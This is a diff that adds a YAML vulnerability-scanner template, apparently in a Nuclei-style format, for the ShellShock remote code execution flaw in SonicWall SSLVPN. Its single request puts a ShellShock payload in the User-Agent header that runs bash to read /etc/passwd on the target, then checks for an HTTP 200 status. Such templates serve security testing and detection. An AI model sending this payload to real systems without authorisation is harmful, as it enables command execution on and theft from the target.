@@ -1,0 +1,24 @@
+id: sonicwall-sslvpn-shellshock
+brief:
+    title: Sonicwall SSLVPN - Remote Code Execution (ShellShock)
+    by: PR3R00T
+    level: critical
+    about: Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execute arbitrary commands.
+    label:
+        - shellshock
+        - sonicwall
+        - rce
+        - vpn
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cgi-bin/jarrewrite.sh'
+      head:
+        Accept: '*/*'
+        User-Agent: '"() { :; }; echo ; /bin/bash -c ''cat /etc/passwd''"'
+      signs:
+        - "on": status
+          status:
+            - 200
